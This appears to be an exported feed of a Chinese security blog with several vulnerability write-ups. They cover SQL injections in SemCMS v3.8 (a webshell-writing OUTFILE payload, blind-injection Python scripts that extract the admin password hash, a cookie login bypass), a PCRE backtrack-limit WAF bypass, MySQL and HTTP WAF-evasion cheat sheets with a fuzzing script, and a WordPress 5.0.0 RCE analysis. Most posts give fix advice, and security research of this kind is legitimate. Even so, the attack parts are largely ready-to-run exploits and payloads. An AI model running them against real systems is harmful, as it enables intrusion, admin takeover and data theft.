while($row=mysqli_fetch_array($query))&#123; $str.= "LOCATE(',".$row['ID'].",', products_category)&gt;0 or "; &#125; $strs ="(".rtrim($str,"or ").")"; return $strs;&#125; 可以看到未经任何过滤直接拼接带入了sql语句。 0x02 poc直接构造一个写webshell的payload1http://127.0.0.1/semcms_php_v3.8/9GJQNH_Admin/SEMCMS_Products.php?searchml=1%27,%20category_path)%3E0%20and%20category_open=1%20union%20select%20%22%3C?php%20phpinfo();?%3E%22%20into%20outfile%20%22F:\\phpstudy\\PHPTutorial\\WWW\\semcms_php_v3.8\\boogle.php%22--%20- 访问http://127.0.0.1/semcms_php_v3.8/boogle.php,看到写入成功 0x03 修复方法将REQUEST改为GET]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>0day挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[semcms_php_v3.8 时间盲注]]></title>
    <url>%2Fsemcms-php-v3-8-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%2F</url>
    <content type="text"><![CDATA[0x00 前言此篇为审计semcms_php_v3.8的第三篇文章 SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。官网:http://www.sem-cms.com/审计版本为最新php版 v3.8 0x01 web_check.php时间盲注得后台账号密码首先查看后台登陆页面,忘记密码处后台index.html代码1234567891011121314151617181920212223242526272829303132&lt;ul&gt;&lt;li style="text-align:right; margin-right:10px; float:right;"&gt;&lt;a href="javascript:views();"&gt;如果忘记账号与密码,试试找回?&lt;/a&gt;&lt;input type="image" style="width:70px; height:28px; border:0px;" src="SC_Page_Config/Image/SEMCMS_Longin.jpg" /&gt;&lt;/li&gt;&lt;/ul&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;script type="text/javascript"&gt;function views()&#123;TINY.box.show('SEMCMS_Remail.php?type=find',1,500,130,1)&#125;if (Request("type")=="ok")&#123; var umail=Request("umail") ; TINY.box.show('SEMCMS_Remail.php?type=ok&amp;umail='+umail,1,500,230,1) &#125;function Request(strName)&#123;thisURL = decodeURIComponent(document.URL);strwrite = thisURL//document.write(strwrite);var strHref =strwrite;var intPos = strHref.indexOf("?");var strRight = strHref.substr(intPos + 1);var arrTmp = strRight.split("&amp;");for(var i = 0; i &lt; arrTmp.length; i++)&#123;var arrTemp = arrTmp[i ].split("=");if(arrTemp[0].toUpperCase() == strName.toUpperCase()) return arrTemp[1];&#125;return "";&#125;&lt;/script&gt; 可以当点击忘记密码时，会调用js的views()函数，而该，函数请求了SEMCMS_Remail.php。跟进SEMCMS_Remail.php查看,发现又调用了../Include/web_check.php1234567&lt;form name="form" action="../Include/web_check.php?type=fintpassword" method="post"&gt;&lt;table width="500" cellpadding="0" cellspacing="0" class="table"&gt;&lt;tr&gt;&lt;td colspan="2" align="right" class="tdsbg"&gt;&lt;span style=" float:left;"&gt;&lt;b&gt;找回账号密码!&lt;/b&gt;&lt;/span&gt;&lt;a href="javascript:TINY.box.hide()"&gt;&lt;img src="SC_Page_Config/Image/icons/hr.gif" border="0" /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="20%" align="right" valign="middle"&gt;输入E-mail:&lt;/td&gt;&lt;td align="left" valign="middle"&gt;&lt;input name="Email" type="text" id="Email" size="50" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align="right" valign="middle"&gt; &lt;/td&gt;&lt;td align="center" valign="middle"&gt;&lt;input type="hidden" name="furl" id="furl" value="&lt;?php echo $url = "http://".$_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF']; ?&gt;" &gt; &lt;input type="submit" name="button" id="button" value="确认找回!" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; &lt;/form&gt; 再次跟进../Include/web_check.php发现可以通过直接访问该页面，传入相应的操作进行请求,而无需从后台登陆处忘记密码进入。当GET传入的type为findok时，进入如下分支1234567891011121314151617181920212223elseif ($Type=="findok")&#123; // 密码找回 $umail=test_input(verify_str($_POST['Email'])); $umm=test_input(verify_str($_POST['umima'])); $urzm=test_input(verify_str($_POST['uyzm'])); $fhurl=str_replace("SEMCMS_Remail.php","",$_POST['furl']); if(empty($umail) || empty($umm) || empty($urzm))&#123; echo'&lt;script language="javascript"&gt;alert("请输入密码与认证码！");history.go(-1);&lt;/script&gt;'; &#125;else&#123; $query=$db_conn-&gt;query("select * from sc_user where user_email='".$umail."' and user_rzm='".$urzm."'"); if (mysqli_num_rows($query)&gt;0)&#123; $db_conn-&gt;query("UPDATE sc_user SET user_ps=md5($umm) WHERE user_email='".$umail."' and user_rzm='$urzm'"); echo'&lt;script language="javascript"&gt;alert("操作成功返回登陆！");location.href="'.$fhurl.'";&lt;/script&gt;'; &#125;else&#123; echo'&lt;script language="javascript"&gt;alert("邮箱或者验证码错误");location.href="'.$fhurl.'";&lt;/script&gt;'; &#125; &#125; &#125; 而仔细观察后发现，这里漏洞利用点是前面两篇出现问题的集合，第一篇中讲到可以通过sql盲注获取当前表段的内容，但是由于在那张表中的信息没有很多用处而显得相对鸡肋。而第二篇则是查询两个参数，由于没有对反斜线做过滤，导致前一个参数可以将单引号转义，从而与后面参数单引号闭合导致注入。这里的问题便是两个参数，前者可以将后者闭合，而当前表又是存储了账号密码的sc_user表，是第一篇的鸡肋得到放大。 0x02 poc话不多说，直接放上payload123456789101112131415161718192021import requestsimport timeburp0_url = "http://127.0.0.1:80/semcms_php_v3.8/include/web_check.php?type=findok"burp0_headers = &#123;"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Referer": "http://127.0.0.1/semcms_php_v3.8/include/web_check.php?type=finddo&amp;XDEBUG_SESSION_START=17436", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"&#125;payload = "or if(ascii(substr(user_ps,&#123;0&#125;,1)) like &#123;1&#125;,sleep(3),1)-- -"passwd = ''for i in xrange(1,33): for j in xrange(32,127): burp0_data=&#123;"Email": "1\\\\", "umima": "boogle", "uyzm": payload.format(str(i),str(j))&#125; start_time = time.time() res = requests.post(burp0_url,headers=burp0_headers,data=burp0_data) #print burp0_data if time.time()-start_time &gt; 3: passwd+=chr(j) print "[+]The md5 password is :"+passwd breakprint "[+]Success get the password!" 0x03 修改后台密码1$db_conn-&gt;query("UPDATE sc_user SET user_ps=md5($umm) WHERE user_email='".$umail."' and user_rzm='$urzm'"); 对前面的payload执行结果可以看到，这里由于数据库中对密码采用md5加密，如果密码比较复杂的话，可以就无法查询出明文结果。那么便可以继续查看findok后面的update操作。1$db_conn-&gt;query("UPDATE sc_user SET user_ps=md5($umm) WHERE user_email='".$umail."' and user_rzm='$urzm'"); 在该操作中，如果知道$umail和$urzm的值，便可以对密码进行修改。而这两个值均可以通过前面注入出密码的方法得到，这里不再赘述，诸位可自行继续操作。例如此处得到`$umail=boogle@qq.com$urzm=6666`修改密码payload123//postEmail=boogle@qq.com&amp;umima=boogle_password&amp;urzm=6666 此处成功修改后台管理员密码为123 0x04 修复方法还是可以通过之前的修复方法，对反斜线\增加过滤即可。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>0day挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[semcms_php_v3.8 cookie注入绕过后台登陆]]></title>
    <url>%2Fsemcms-php-v3-8-cookie%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%2F</url>
    <content type="text"><![CDATA[0x00 前言此篇为审计semcms_php_v3.8的第二篇文章 SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。官网:http://www.sem-cms.com/审计版本为最新php版 v3.8 0x01 cookie注入导致后台登陆绕过首先查看后台主页SEMCMS_Main.php,包含了SEMCMS_Top_include.php,跟进看到checkuser函数，猜测应该时验证是否登陆的。继续跟进checkuser()函数12345678910111213141516171819function checkuser($db_conn)&#123; //判断用户是否登陆 $cookieuseradmin=@verify_str(test_input($_COOKIE["scuseradmin"])); $cookieuserpass=@verify_str(test_input($_COOKIE["scuserpass"])); $query=$db_conn-&gt;query("select * from sc_user where user_admin='$cookieuseradmin' and user_ps='$cookieuserpass'"); if (mysqli_num_rows($query)&gt;0)&#123; $row=mysqli_fetch_assoc($query); return $row['user_qx']; &#125;else&#123; echo "&lt;script language='javascript'&gt;alert('账号密码不正确重新登陆！');top.location.href='index.html';&lt;/script&gt;"; exit; &#125;&#125; 发现用户名和密码均来自cookie，然后带入sql语句查询，要传入的值经过了test_input和verify_str的过滤，跟进查看一下。verify_str的值我们上一篇审计的时候查看过了，过滤几个sql语句虽然过滤了单引号&#39;，但是并没有过滤\,看看是否能通过转义符\将$cookieuseradmin后面的单引号闭合，从而绕过检测。继续查看test_input12345678function test_input($data) &#123; $data = str_replace("%", "percent", $data); $data = trim($data); $data = stripslashes($data); $data = htmlspecialchars($data,ENT_QUOTES); return $data; &#125; 这里需要注意的是stripslashes，因为stripslashes对\作了处理，但是幸运的是两个反斜线\\时会返回一个。 这里便可以构造cookie值1scuseradmin=Admin\\; scuserpass=or 1 like 1 -- -; 那么拼接后的sql语句即为1select * from sc_user where user_admin='Admin\\' and user_ps='or 1 like 1 -- -' 成功绕过登陆 0x02 poc 0x03 修复方法inject_check_sql()函数中增加对反斜线\的过滤]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>0day挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[semcms_php_v3.8 前台鸡肋sql注入]]></title>
    <url>%2Fsemcms-php-v3-8-%E5%89%8D%E5%8F%B0%E9%B8%A1%E8%82%8Bsql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[0x00 前言SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。官网:http://www.sem-cms.com/审计版本为最新php版 v3.8 0x01 鸡肋sql注入首先查看index.php引入了web_inc.php,跟进查看，发现第一处sql查询可以看到language变量未用引号包裹，但是在此之前使用verify_str()函数对传入的参数进行了处理。跟进发现是过滤函数,对常用sql语句进行了过滤针对过滤函数，可以发现可以对其进行sql盲注。其中 = 可以使用like绕过构造注入语句1http://127.0.0.1/semcms_php_v3.8/?languageIDD=1 and greatest(length(database()),0) like 1 1http://127.0.0.1/semcms_php_v3.8/?languageIDD=1 and greatest(length(database()),0) like 5 可以看到存在明显注入并得到数据库长度但是这里比较鸡肋的是，因为过滤函数过滤了select。导致无法深层次的获取数据库内容，只能获取database(),’user()’,’version()’等信息。 0x03 鸡肋放大这里虽然无法使用select语句获取更多信息，但也不局限于database()等信息。可以通过盲注获取当前表即其查询的sc_tagandseo表内其他字段内容。因为该cms安装数据库时为自动安装，所以所有字段名都可以得到。这里以tag_newkey为例http://127.0.0.1/semcms_php_v3.8/?languageIDD=1%20and%20greatest(ascii(substr(tag_newkey,1,1)),0)%20like%201http://127.0.0.1/semcms_php_v3.8/?languageIDD=1%20and%20greatest(ascii(substr(tag_newkey,1,1)),0)%20like%20110页面返回不同证明了可以进行注入。 这里其实只是证明可以通过注入获取数据，然而从该表注入出的数据并没有什么卵用。既然绕过了其过滤函数，继续全局搜索，看看其他表是否存在类似注入，稍微搜一下，发现sc_email`sc_msg`等多个表的查询还是有类似情况的，这几个表的信息还是比较丰富的，没有继续深究，诸位可继续深入挖掘。 0x04 poc上面提到的简单exp，可供测试123456789101112131415161718192021222324252627282930313233343536373839import requests #[+]author by boogle#[+]blog: https://boogle.github.iourl = 'http://127.0.0.1/semcms_php_v3.8/?languageIDD=1'payload_len = ' and greatest(length(database()),0) like &#123;0&#125;'payload_database = '%20and%20greatest(ascii(substr(database(),&#123;0&#125;,1)),0)%20like%20&#123;1&#125;'payload_tag = '%20and%20greatest(ascii(substr(tag_newkey,&#123;0&#125;,1)),0)%20like%20&#123;1&#125;'#获取数据库长度for i in range(0,16): payload = url+payload_len.format(str(i)) #print payload res = requests.get(payload) if 'About Us' in res.text: print '[+] The databse length is '+str(i) length = i break# 获取数据库databse = ''for i in range(1,length+1): for j in xrange(0,128): payload = url + payload_database.format(str(i),str(j)) res = requests.get(payload) if 'About Us' in res.text: databse += chr(j) print '[+] Payloading :'+databse breakprint '[+] The databse is '+databse#获取tag_newkey字段内容tag=''for i in range(1,5): for j in xrange(0,128): payload = url + payload_tag.format(str(i),str(j)) res = requests.get(payload) if 'We main manufacturer' in res.text: tag += chr(j) print '[+] Payloading :'+tag breakprint '[+]tag_newkey '+tag 0x05 修复方案传入的int类型参数使用intval()函数强制类型转换。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>0day挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bypass PCREWAF]]></title>
    <url>%2FBypass-PCREWAF%2F</url>
    <content type="text"><![CDATA[0x00 前言起源于CODEBREAKING中一个ctf题目 easy - pcrewaf1234567891011121314151617181920&lt;?phpfunction is_php($data)&#123; return preg_match('/&lt;\?.*[(`;?&gt;].*/is', $data);&#125;if(empty($_FILES)) &#123; die(show_source(__FILE__));&#125;$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);$data = file_get_contents($_FILES['file']['tmp_name']);if (is_php($data)) &#123; echo "bad request";&#125; else &#123; @mkdir($user_dir, 0755); $path = $user_dir . '/' . random_int(0, 10) . '.php'; move_uploaded_file($_FILES['file']['tmp_name'], $path); header("Location: $path", true, 303);&#125; 0x01 题目分析题目大意为向服务器写入一个php文件，但是文件内容收到了限制1preg_match('/&lt;\?.*[(`;?&gt;].*/is', $data) 正则匹配了php标签，也就是说我们无法写入php代码，常规绕过思路是使用ASP标签&lt;% %&gt;或者script PHP标签&lt;script language=&quot;php&quot;&gt;来区分php代码，但是题目环境使用php7版本，这两种标签均被移除。 这里，PHITHON大神提到了一种很好的方式：PHP利用PCRE回溯次数限制绕过某些安全限制 0x02 利用pcre.backtrack_limit限制绕过pcrewaf常见正则有两种匹配形式 DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入 NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态 而php所使用的pcre库则采用了NFA方式 那么何为回溯呢？这里以此题的正则为例匹配&lt;?php phpinfo();//booglewadwdadadwad1/&lt;\?.*[(`;?&gt;].*/is 当其执行到第一个.*时，它会匹配到后面所有的内容而继续执行到 [(;?&gt;]时，前面匹配的全部内容显然不符合，此时便会进行回溯。直到匹配到;时符合条件 那么这里便有一个问题，如果回溯时无关字符无限长，那么岂不是会导致正则永远无法执行完成，导致正则dos。其实为了防止这种情况的发生，pcre对回溯次数做了限制，默认配置回溯次数pcre.backtrack_limit为1000000次。当回溯次数超过一百万次时，会返回false,那么这个题目便可构造超长的回溯次数使其返回false绕过文件内容检查。 0x03 payload1234567891011121314151617import requestsfrom io import BytesIOfrom hashlib import md5file = &#123; 'file':BytesIO(b'&lt;?php phpinfo();//'+b'a'*1000000)&#125;url = 'http://192.168.111.139:8088/'r=requests.post(url=url,files=file)m = md5()m.update('192.168.111.1')path = '/data/'+m.hexdigest()for i in xrange(0,10): u = url+path+'/'+str(i)+'.php' res = requests.get(u) if res.status_code == 200: print u 0x04 修复方法题目中使用了preg_match对字符串匹配，采用===判断返回值123if(is_php($input) === 0) &#123; ...&#125;]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从http协议层面和数据库层面绕过waf]]></title>
    <url>%2F%E4%BB%8Ehttp%E5%8D%8F%E8%AE%AE%E5%B1%82%E9%9D%A2%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B1%82%E9%9D%A2%E7%BB%95%E8%BF%87waf%2F</url>
    <content type="text"><![CDATA[0x01 http协议层面绕过waf此部分参考在HTTP协议层面绕过WAF、利用分块传输吊打所有WAF http管道化pipelinehttp管道化允许多个http请求通过一个套接字同时被输出 ，而不用等待相应的响应。然后请求者就会等待各自的响应，这些响应是按照之前请求的顺序依次到达。因为多个请求可被同时传送，如果waf只检测第一个请求，而忽略后面的请求，便可被绕过。下面介绍通过burpsuite同时发送多个请求首先关闭Update Content-Length然后修改Connection字段值为keep-alive,将多个请求包在数据段后面拼接即可，前面的数据包通过设置Content-Length字段，只会读取到指定的位置，剩下的数据将作为第二个请求。可以看到服务端返回了两个Response,但第二个带有and关键字被安全狗拦截，说明该方法无法绕过安全狗，但不排除绕过其他waf的可能。12补充：在进行环境测试时，发现php版本为`nts`时，服务端只会返回一个响应，原因未知。建议大家在遇到这种情况时可以更换`thread safe`版本 http分块传输通过在数据包中添加Transfer-Encoding: chunked,标示报文采用分块编码。此时会忽略Content-Length字段设置。此时数据部分为一系列分块，每个分块包含十六进制的长度值和数据，长度值与数据各占一行。最后用0标志分块结束并且最后紧跟两个换行。可以看到该方法将关键字分块传输绕过了waf。但是Imperva、360等WAF已经对Transfer-Encoding的分块传输做了处理，将分块组合成完整数据包进行分析，导致关键字被拦截。此时可以通过在分块传输的长度标识后面添加;作为注释，随机添加注释内容，便可使waf无法识别。另外对于加载在中间件上的插件ModSecurity，因为其不会解析http数据包内容，因此基于ModSecurity的waf产品用上述方法便无法绕过。但是可以通过发送畸形的分块数据包，即使分块数据块出错，例如长度值与数据不符等，将攻击语句添加在url中。此时apache会因为畸形分块数据包而报错，导致ModSecurity不会处理错误的数据包，而apache强大的容错能力继续执行了可以解析的部分。 http协议未覆盖http头中Content-Type字段一般可以设置三种参数提交形方式：application/x-www-form-urlencoded，multipart/form-data，text/plain。当waf未能覆盖multipart/form-data提交方式时，或者waf认为其为文件上传请求，从而只检测文件上传，导致waf被绕过。 http字符集编码在Content-Type中可以使用charset定义字符集，如果基于规则引擎的waf未对相应字符集进行处理，则可以被绕过burpsuite修改charset可自动encode。 0x02 数据库层面绕过waf此部分参考WAF Bypass数据库特性（Mysql探索篇）以Mysql数据库为例分析 例句形式常见有5个位置即：SELECT * FROM admin WHERE username = 1【位置一】union【位置二】select【位置三】1,user()【位置四】from【位置五】admin 通用空格替换符 注释符 /**/ /*!00000union*/ 空白符%09,%0a,%0b,%0c,%0d以上注释和空白符可用于所有位置位置一 union之前 浮点数 1.0union 1.union 等形式 科学计数法 1E0union 浮点数特殊形式 %1.union %2.union %1%2eunion \N形式 \Nunion位置二 union和select之间 ()包裹select语句位置三 select之后 特殊字符 ! + - @ ~上面字符除@外，可单个或随机自由数量组合使用 如select!~!!!-+~@1,2,3 引号 select&quot;1&quot;,2,3 \N形式 select\N,2,3 花括号形式 select{x 1},2,3位置四 from之前 浮点数 select 1,2,3.0from 或 3.from 科学计数法 select 1,2,3E0from 浮点数特殊形式 %1.from %2.from %1%2efrom \N形式 select 1,2,\Nfrom 带括号的函数 如select 1,2,user()from 破浪号 1select 1,2,3`from 破浪号后加任意字符串 1select 1,2,3`booglefrom 花括号形式 select 1,2,{x 3}from 位置五 from之后 破浪号 1select 1,2,3 from`user 破浪号包裹 1select 1,2,3 from`user` 括号()包裹 select 1,2,3 from(user) 花括号形式 select 1,2,3 from{x user} 查询同一个表的情况下，可以加任意数字字母 select * from user where id = -1 union select 1,user(),3 fromboogle123user等价函数 字符串截取函数 12345678910111213Mid(version(),1,1)Substr(version(),1,1)Substring(version(),1,1)Lpad(version(),1,1)Rpad(version(),1,1)Left(version(),1)reverse(right(reverse(version()),1)) 字符串连接函数 123concat(version(),'|',user());concat_ws('|',1,2,3) 延时注入相关函数 12345678(1) sleep(5) select * from user where id = 1 and if(left(database(),1)='g',sleep(5),1)(2) benchmark(count,expr) select * from user where id = 1 and if(left(database(),1)='t',(select benchmark(10000000,md5('boogle'))),1)(3) 计算笛卡尔积 select * from user where id = 1 and if(left(database(),1)='t',(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)(4) 正则bug(受mysql版本影响，部分不可行) select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b') 报错函数 12345678910111213141516171819202122232425262728293031(1) 通过floor报错,注入语句如下: and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);(2) 通过ExtractValue报错,注入语句如下: and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));(3) 通过UpdateXml报错,注入语句如下: and 1=(updatexml(1,concat(0x3a,(select user())),1))4、通过NAME_CONST报错,注入语句如下: and exists(select * from (select * from(select name_const(version(),0))a join (select name_const(version(),0))b)c);(5) 通过join报错爆字段,注入语句如下:（在知道数据库跟表名的情况下使用才可以爆字段） select * from (select * from 表名 a join 表名 b) c) 然后得到字段 如果想在爆下一个字段 就得加上using (已知的字段） 在下一个字段 如果想在爆下一个字段 就得加上using (已知的字段,已知的字段 ） select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段 ） ) c)(6) 通过exp报错,注入语句如下: and exp(~(select * from (select user() ) a) );(7) 通过GeometryCollection()报错,注入语句如下: and geometrycollection((select * from(select * from(select user())a)b));(8) 通过polygon ()报错,注入语句如下: and polygon((select * from(select * from(select user())a)b));(9) 通过multipoint ()报错,注入语句如下: and multipoint((select * from(select * from(select user())a)b));(10) 通过multilinestring()报错,注入语句如下: and multilinestring((select * from(select * from(select user())a)b));(11) 通过multipolygon()报错,注入语句如下: and multipolygon((select * from(select * from(select user())a)b));(12) 通过linestring ()报错,注入语句如下: and multilinestring((select * from(select * from(select user())a)b)); 过滤特殊字符 123456789101112131415(1)limit处的逗号： limit 1 offset 0(2)字符串截取处的逗号 mid处的逗号： mid(version() from 1 for 1)(3)union处的逗号： 通过join拼接。SELECT * FROM admin WHERE username = 1 union select * from (select 1)a join(select&#123;x schema_name&#125; from information_schema.SCHEMATA limit 1,1)b (4)操作符&lt;&gt;被过滤select * from users where id=1 and ascii(substr(database(),0,1))&gt;64此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值。那么上面的这条sql语句可以使用greatest变为如下的子句:select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64总结：使用greatest()绕过比较操作符。 0x03 绕过安全狗测试狗狗为最新版经测试，狗狗拦截点为union select之间和from之后from之后可以使用破浪号或者花括号形式绕过，而union select可以使用注释符/**/方法,但是单纯的注释符会触发狗狗的拦截规则，这里对其填充字符进行fuzz1234567891011121314import requestsburp0_url = "http://127.0.0.1:80/test.php?id=-1 union/*%&#123;0&#125;%&#123;1&#125;*/select 1,password,3 from`user`"burp0_cookies = &#123;"ECS[visit_times]": "9", "__atuvc": "2%7C6", "safedog-flow-item": "83B003D84BC326490BB46CB86446460A"&#125;burp0_headers = &#123;"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"&#125;requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)for i in range(0,128): for x in range(0,100): a=burp0_url.format(str(hex(i))[2:],str(hex(x))[2:]) req = requests.get(a,headers=burp0_headers,cookies=burp0_cookies) if 'dc647eb65e6711e155375218212b3964' in req.text: print '[+]'+a print '[+]'+'%'+str(hex(i))[2:]+'%'+str(hex(x))[2:]+' '+chr(i)+' '+chr(x) 以下姿势均可以绕过]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wordpress5.0.0 远程代码执行漏洞分析]]></title>
    <url>%2Fwordpress5-0-0-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x00 前言该漏洞由RIPS团队发现并公开在其Blog,在其blog中可发现该漏洞为数据覆盖+目录穿越写文件+文件包含三个漏洞组成的远程代码执行漏洞。根据其提供的漏洞细节可发现在edit_post()中未对post数据做任何过滤，导致可以传入meta_input数组并最终对数据库内容进行覆盖。这一方法在发生在对媒体文件修改属性时调用，因此需要具有author权限，在操作的媒体文件数据中_wp_attached_file字段指明了文件路径，而在对图片进行裁剪操作时，图片存放文章取决于该字段，因此可以实现目录穿越向任意目录写文件，最终可以将文件写入到主题文件进行包含的位置可实现远程代码执行。 0x01 漏洞分析数据覆盖漏洞根据RIPS提供的信息，漏洞发生在edit_post方法和update_post_meta方法中，直接跟踪到这两个方法。 12345678910function edit_post( $post_data = null ) &#123; if ( empty($postarr) ) $postarr = &amp;$_POST; ⋮ if ( ! empty( $postarr['meta_input'] ) ) &#123; foreach ( $postarr['meta_input'] as $field =&gt; $value ) &#123; update_post_meta( $post_ID, $field, $value ); &#125; &#125; 在edit_post方法中发现对post来的数据未做任何处理。而对图片属性进行修改时可直接诱发该方法 然后调用update_post_meta方法根据post_ID修改post meta field,调用wp_update_post方法更新post_data。在wp_update_post方法中会调用wp_insert_post()在wp_insert_post()方法中遍历meta_input调用update_post_meta对数据进行更新操作， 函数调用栈， 至此可覆盖数据库中_wp_attached_file内容post数据包，只需在正常修改图片属性post数据中添加&amp;meta_input[_wp_attached_file]=/test/boogle.jpg123post_wpnonce=6b7df5b262&amp;_wp_http_referer=%2Fwordpress-5.0%2Fwp-admin%2Fpost.php%3Fpost%3D7%26action%3Dedit%26message%3D1&amp;user_ID=2&amp;action=editpost&amp;originalaction=editpost&amp;post_author=2&amp;post_type=attachment&amp;original_post_status=inherit&amp;referredby=http%3A%2F%2F127.0.0.1%2Fwordpress-5.0%2Fwp-admin%2Fpost.php%3Fpost%3D7%26action%3Dedit&amp;_wp_original_http_referer=http%3A%2F%2F127.0.0.1%2Fwordpress-5.0%2Fwp-admin%2Fpost.php%3Fpost%3D7%26action%3Dedit&amp;post_ID=7&amp;meta-box-order-nonce=39163aa91a&amp;closedpostboxesnonce=1e6416f7d7&amp;post_title=avatar&amp;samplepermalinknonce=7548fad608&amp;excerpt=123&amp;_wp_attachment_image_alt=123&amp;content=sdd&amp;attachment_url=http%3A%2F%2F127.0.0.1%2Fwordpress-5.0%2Fwp-content%2Fuploads%2F2019%2F02%2F2-4.jpg%23%2F..%2F..%2F..%2F..%2Fthemes%2Ftwentynineteen%2F32.jpg&amp;original_publish=Update&amp;save=Update&amp;advanced_view=1&amp;comment_status=open&amp;add_comment_nonce=17653878f1&amp;_ajax_fetch_list_nonce=82034e96c4&amp;_wp_http_referer=%2Fwordpress-5.0%2Fwp-admin%2Fpost.php%3Fpost%3D7%26action%3Dedit%26message%3D1&amp;post_name=avatar-2&amp;meta_input[_wp_attached_file]=/test/boogle.jpg 目录穿越写文件上面我们已经能够控制_wp_attached_file的值，但这并什么带来什么实际影响，因此进行全局搜索，看看哪些地方用到了这个值，并进一步进行利用。搜索发现在get_attached_file()方法中，对该值进行了获取，最拼接在$file变量中返回 补充：在wordpress在图片裁剪时，首先会从默认目录wp-content\uploads\yyyy\mm查找，如果不存在，则会从本地服务器下载，下载url为http://127.0.0.1/wordpress/wp-content/uploads+_wp_attached_file拼接的结果，这里可以使用url获取资源的特点，如boogle.jpg?../../boo.jpg本地查找不存在而下载时又会定位到boogle.jpg，而忽略?后面的内容。另外windows目录中不允许存在?，可以使用#代替。 然后继续向上跟踪查看哪里调用了该方法。定位到wp_crop_image()方法，并且在该方法中进行了简单拼接作为文件名进行了保存，而该方法的作用为裁剪图片，即我们可以能控制裁剪操作后图片保存的位置。继续向上跟踪，在wp_ajax_crop_image()方法中对裁剪方法进行了调用跟踪到这时本来一切顺利，心思只要进行图片裁剪便会触发漏洞，然而还是水平太菜，没有触发漏洞，也没有定位到哪里调用了该方法，此处膜拜大佬。 问题出现在在进行裁剪时没有调用该裁剪方法，而需要修改数据包手动调用。在admin-ajax.php对这些方法进行了判断 最终在apply_filters()方法中，进行了动态调用 这里直接附post123POST action=crop-image&amp;_ajax_nonce=b259baa5c9&amp;postid=8&amp;history=%5B%7B%22c%22%3A%7B%22x%22%3A24%2C%22y%22%3A21%2C%22w%22%3A40%2C%22h%22%3A44%7D%7D%5D&amp;target=all&amp;context=&amp;do=save&amp;id=8&amp;cropDetails[dst_width]=8&amp;cropDetails[dst_height]=8 文件包含后面讲继续分析，这里可以参考https://mp.weixin.qq.com/s/9DMGLOvFJUjq8MaMr9eg6A 0x02 